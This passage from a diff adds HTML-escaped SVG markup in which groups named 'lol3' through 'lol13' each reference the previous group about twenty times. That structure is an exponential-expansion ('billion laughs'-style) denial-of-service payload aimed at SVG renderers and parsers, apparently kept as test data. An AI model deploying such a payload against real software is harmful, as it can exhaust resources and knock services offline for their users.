+        &lt;\use x&#x3D;&quot;81.47392696417008&quot; y&#x3D;&quot;26.105538001118454&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;42.68647219221483&quot; y&#x3D;&quot;14.928065055799067&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;76.60711684246174&quot; y&#x3D;&quot;63.12387102103252&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;83.48508116660341&quot; y&#x3D;&quot;78.33759912679486&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;86.76518105465242&quot; y&#x3D;&quot;0.6627041752897189&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;79.68328408994962&quot; y&#x3D;&quot;0.37460544212813973&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;13.40066748981954&quot; y&#x3D;&quot;27.308588503744947&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;67.78971535965864&quot; y&#x3D;&quot;5.2137839118656215&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol5&quot;&gt;
+        &lt;\use x&#x3D;&quot;93.17317533175974&quot; y&#x3D;&quot;44.52172660268161&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;59.7047303911007&quot; y&#x3D;&quot;16.74256469896106&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;5.654917812553983&quot; y&#x3D;&quot;79.98613856580144&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;75.149819280575&quot; y&#x3D;&quot;15.308935463362882&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;81.50062429558551&quot; y&#x3D;&quot;42.53215429468782&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;87.56501434977008&quot; y&#x3D;&quot;61.64518577514504&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;71.9623610344727&quot; y&#x3D;&quot;69.30539175637415&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;2.9301783929564174&quot; y&#x3D;&quot;37.84629912791099&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;53.44457290524593&quot; y&#x3D;&quot;82.748935910471&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;24.098634028941813&quot; y&#x3D;&quot;63.81920974630777&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;5.7382196208046405&quot; y&#x3D;&quot;8.663835783794848&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.99812648454562&quot; y&#x3D;&quot;83.88437531488493&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;94.20366535130715&quot; y&#x3D;&quot;43.823598928864904&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;36.27876853708833&quot; y&#x3D;&quot;22.36047146651723&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;22.09005053344163&quot; y&#x3D;&quot;95.73644485233157&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;35.41097940354794&quot; y&#x3D;&quot;42.56652839302125&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;82.40963077502657&quot; y&#x3D;&quot;78.14221331091551&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;22.51700804470844&quot; y&#x3D;&quot;19.43705334442657&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;48.71847189920852&quot; y&#x3D;&quot;44.37518556460706&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;4.873324773376975&quot; y&#x3D;&quot;30.580346369426692&quot; xlink:href&#x3D;&quot;#lol4&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol6&quot;&gt;
+        &lt;\use x&#x3D;&quot;98.05629489788964&quot; y&#x3D;&quot;70.94474876945688&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;92.63451556137652&quot; y&#x3D;&quot;47.065098786535906&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;59.51804139123558&quot; y&#x3D;&quot;81.61972423037916&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.221893097530145&quot; y&#x3D;&quot;91.97963856285426&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;2.354771352316287&quot; y&#x3D;&quot;79.41781570994908&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;12.644195911619228&quot; y&#x3D;&quot;35.27147472821199&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;29.663506347039004&quot; y&#x3D;&quot;64.54865249046898&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;12.868470623419148&quot; y&#x3D;&quot;49.020945532408774&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;89.78157001796552&quot; y&#x3D;&quot;8.000713725716146&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.922994965609515&quot; y&#x3D;&quot;35.847828128364746&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;97.88799188373886&quot; y&#x3D;&quot;50.28432230026101&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;10.172713300004322&quot; y&#x3D;&quot;69.23820155377607&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;27.178628050396537&quot; y&#x3D;&quot;55.482872334398806&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;79.09705950674046&quot; y&#x3D;&quot;4.363129811866218&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;81.04585791160216&quot; y&#x3D;&quot;12.592184012736574&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;82.06086081186544&quot; y&#x3D;&quot;44.621698737301344&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;33.42273891081026&quot; y&#x3D;&quot;45.95563328529262&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;19.18483902783844&quot; y&#x3D;&quot;78.37809590403137&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;88.09172396266952&quot; y&#x3D;&quot;45.13447141134191&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;2.8823244116365387&quot; y&#x3D;&quot;23.173000909258455&quot; xlink:href&#x3D;&quot;#lol5&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol7&quot;&gt;
+        &lt;\use x&#x3D;&quot;37.376470115858915&quot; y&#x3D;&quot;62.36067779991023&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;33.02928285082976&quot; y&#x3D;&quot;57.46765731411902&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.605657621357203&quot; y&#x3D;&quot;87.86416224177852&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;5.175379106707778&quot; y&#x3D;&quot;48.00667054106194&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;8.537548829202379&quot; y&#x3D;&quot;76.6223848267762&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;57.78056424246593&quot; y&#x3D;&quot;84.83452098490157&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;43.931295161019676&quot; y&#x3D;&quot;10.324960838594798&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;34.7314405665199&quot; y&#x3D;&quot;81.7462196586418&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;65.18697618599026&quot; y&#x3D;&quot;80.1983152141804&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;7.124099082814284&quot; y&#x3D;&quot;30.06000010921991&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;89.871509301983&quot; y&#x3D;&quot;13.357205250880376&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;95.2893814364375&quot; y&#x3D;&quot;90.98598540023866&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.00901498985339&quot; y&#x3D;&quot;51.582391185037416&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;54.795985636569476&quot; y&#x3D;&quot;13.731616365050957&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;37.7719094890396&quot; y&#x3D;&quot;79.2400181447097&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;78.37233217291461&quot; y&#x3D;&quot;77.34821979274172&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;2.477631718903728&quot; y&#x3D;&quot;87.53720122961302&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;95.8182999643927&quot; y&#x3D;&quot;47.44920375516284&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;37.19352271905259&quot; y&#x3D;&quot;62.99167933639199&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.74445485721718&quot; y&#x3D;&quot;61.174398241630065&quot; xlink:href&#x3D;&quot;#lol6&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol8&quot;&gt;
+        &lt;\use x&#x3D;&quot;53.57938395559722&quot; y&#x3D;&quot;62.48883469083333&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;9.018121966719772&quot; y&#x3D;&quot;17.495617253248575&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;16.419379842031944&quot; y&#x3D;&quot;52.784401038399864&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;96.6525704227641&quot; y&#x3D;&quot;87.38513232407564&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;13.748765816027852&quot; y&#x3D;&quot;64.98534487818681&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;39.2149475464457&quot; y&#x3D;&quot;50.92913579276646&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;24.326110948748326&quot; y&#x3D;&quot;99.17374001785626&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;2.5433488067687304&quot; y&#x3D;&quot;45.675240159362&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;78.9028213415977&quot; y&#x3D;&quot;67.895828472876&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;56.70075543950849&quot; y&#x3D;&quot;98.65584164770675&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;77.7783392675984&quot; y&#x3D;&quot;51.85141717431967&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;62.09053977555524&quot; y&#x3D;&quot;37.91654709531274&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;86.10717038918013&quot; y&#x3D;&quot;37.38979798128217&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;63.730474647904124&quot; y&#x3D;&quot;19.36096530643302&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;90.28029810872827&quot; y&#x3D;&quot;89.61656614044033&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;74.00119203334363&quot; y&#x3D;&quot;4.345487006565618&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;28.18653040732154&quot; y&#x3D;&quot;50.224364052021365&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;55.62398065974671&quot; y&#x3D;&quot;25.676261648659093&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;78.46415902957439&quot; y&#x3D;&quot;15.068647918359035&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;36.899310126022165&quot; y&#x3D;&quot;86.44827899413416&quot; xlink:href&#x3D;&quot;#lol7&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol9&quot;&gt;
+        &lt;\use x&#x3D;&quot;7.991574791680689&quot; y&#x3D;&quot;73.44226335666251&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;96.7565388309728&quot; y&#x3D;&quot;65.89095657750181&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;65.58987038043374&quot; y&#x3D;&quot;24.74749362913845&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;39.34613316703547&quot; y&#x3D;&quot;12.298488538034558&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;50.79218621624637&quot; y&#x3D;&quot;9.042795787683854&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;24.251588184995786&quot; y&#x3D;&quot;89.15281395376304&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;81.31221243424903&quot; y&#x3D;&quot;0.2839153247403914&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;66.36103764509119&quot; y&#x3D;&quot;90.42442496170045&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;10.525291924461955&quot; y&#x3D;&quot;49.78388157591939&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;99.70264484438056&quot; y&#x3D;&quot;46.853822950552335&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;56.2838439947329&quot; y&#x3D;&quot;53.47507453678253&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.89104764681762&quot; y&#x3D;&quot;18.706201951401667&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;92.12272648669479&quot; y&#x3D;&quot;80.70913130767299&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;60.29805904812078&quot; y&#x3D;&quot;59.129849640289336&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;0.08633008871001824&quot; y&#x3D;&quot;42.09077381690911&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;88.35904848035982&quot; y&#x3D;&quot;7.789972792729127&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;54.43150231957841&quot; y&#x3D;&quot;89.87198487044455&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;69.481709554136&quot; y&#x3D;&quot;96.54330453185543&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;55.93788947463834&quot; y&#x3D;&quot;2.8459840081797694&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;19.289847249857417&quot; y&#x3D;&quot;14.293186714130869&quot; xlink:href&#x3D;&quot;#lol8&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol10&quot;&gt;
+        &lt;\use x&#x3D;&quot;9.754705520760677&quot; y&#x3D;&quot;24.722483072209922&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;83.9935926063101&quot; y&#x3D;&quot;35.89957584898089&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;62.888174798997184&quot; y&#x3D;&quot;46.97794652746777&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;15.4586289695117&quot; y&#x3D;&quot;96.31629250754042&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;74.3612705201974&quot; y&#x3D;&quot;65.26685003721005&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;2.916918782132405&quot; y&#x3D;&quot;48.87391194303271&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;13.57783746258886&quot; y&#x3D;&quot;88.07918599244142&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;63.955770988200165&quot; y&#x3D;&quot;0.23212191536798876&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;13.494636647771419&quot; y&#x3D;&quot;28.751391249258628&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.19796552063911&quot; y&#x3D;&quot;96.44892858546774&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;20.021698918507212&quot; y&#x3D;&quot;24.002469733373932&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;21.604524673948145&quot; y&#x3D;&quot;29.12853043916779&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;59.652574321305366&quot; y&#x3D;&quot;98.33488619444606&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;7.016703913655498&quot; y&#x3D;&quot;28.41115368773358&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;40.11238729414654&quot; y&#x3D;&quot;11.699907268854892&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;31.80094012201543&quot; y&#x3D;&quot;0.3793839729080095&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;96.75573982918529&quot; y&#x3D;&quot;93.48368006039622&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;7.00301804587764&quot; y&#x3D;&quot;12.806486325561517&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;46.683848238810754&quot; y&#x3D;&quot;35.09344773651238&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;37.9463596506207&quot; y&#x3D;&quot;43.643375559522454&quot; xlink:href&#x3D;&quot;#lol9&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol11&quot;&gt;
+        &lt;\use x&#x3D;&quot;7.254453010734263&quot; y&#x3D;&quot;45.64027418609277&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;96.50081995543133&quot; y&#x3D;&quot;52.52637824841677&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;34.15703901773366&quot; y&#x3D;&quot;62.917181725791124&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;45.9790953323007&quot; y&#x3D;&quot;56.666036592376614&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;78.61696410141631&quot; y&#x3D;&quot;18.689960584612532&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;94.30520692079469&quot; y&#x3D;&quot;54.83947213928294&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;64.1295322351215&quot; y&#x3D;&quot;49.848235565411194&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;63.346333165596015&quot; y&#x3D;&quot;44.015491820450116&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;1.9665880384790335&quot; y&#x3D;&quot;48.09831831020068&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;39.66795570511044&quot; y&#x3D;&quot;41.6618304678875&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;48.2974021887721&quot; y&#x3D;&quot;92.58637601912552&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;42.17968369503355&quot; y&#x3D;&quot;3.1920448104920673&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;9.322219097288254&quot; y&#x3D;&quot;92.08060100428631&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;23.40336011923374&quot; y&#x3D;&quot;70.73800497837239&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;72.50537971860747&quot; y&#x3D;&quot;29.697785299875434&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;82.90499012099956&quot; y&#x3D;&quot;77.08984323465914&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;97.07884149226562&quot; y&#x3D;&quot;23.24024123424151&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;21.412671548353845&quot; y&#x3D;&quot;83.99472581466645&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;76.72988485363909&quot; y&#x3D;&quot;42.464022391567966&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.487650107099554&quot; y&#x3D;&quot;67.42392711253335&quot; xlink:href&#x3D;&quot;#lol10&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol12&quot;&gt;
+        &lt;\use x&#x3D;&quot;83.40854112256866&quot; y&#x3D;&quot;29.373868247296876&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;25.080851368586423&quot; y&#x3D;&quot;20.755782105812294&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;87.47700966228277&quot; y&#x3D;&quot;85.2609042087277&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;42.51614431819798&quot; y&#x3D;&quot;87.36344597505118&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;99.5700642696985&quot; y&#x3D;&quot;95.32497545200329&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;81.6148121479295&quot; y&#x3D;&quot;95.91074728484243&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;39.74834695647138&quot; y&#x3D;&quot;20.43425483812141&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;26.454002909650587&quot; y&#x3D;&quot;22.855618063896966&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;84.0488534220166&quot; y&#x3D;&quot;52.75064154371908&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;76.54270135834528&quot; y&#x3D;&quot;8.723375341020112&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;93.02192268125839&quot; y&#x3D;&quot;43.92731306300763&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;97.05256545081659&quot; y&#x3D;&quot;53.70300734938156&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;70.48724376691669&quot; y&#x3D;&quot;50.530737800380955&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;49.339831255458435&quot; y&#x3D;&quot;69.18033262821494&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;58.95636813108284&quot; y&#x3D;&quot;63.63023458173238&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;38.96756646245644&quot; y&#x3D;&quot;74.54832626637786&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;9.286942463428838&quot; y&#x3D;&quot;25.369999756120432&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;1.9726058213574538&quot; y&#x3D;&quot;50.06206783270996&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;7.748349994519765&quot; y&#x3D;&quot;69.56227224917359&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;62.94985738429626&quot; y&#x3D;&quot;70.5685293032692&quot; xlink:href&#x3D;&quot;#lol11&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol13&quot;&gt;
+        &lt;\use x&#x3D;&quot;87.25929692309387&quot; y&#x3D;&quot;19.807204943939183&quot; xlink:href&#x3D;&quot;#lol12&quot; &#x2F;&gt;
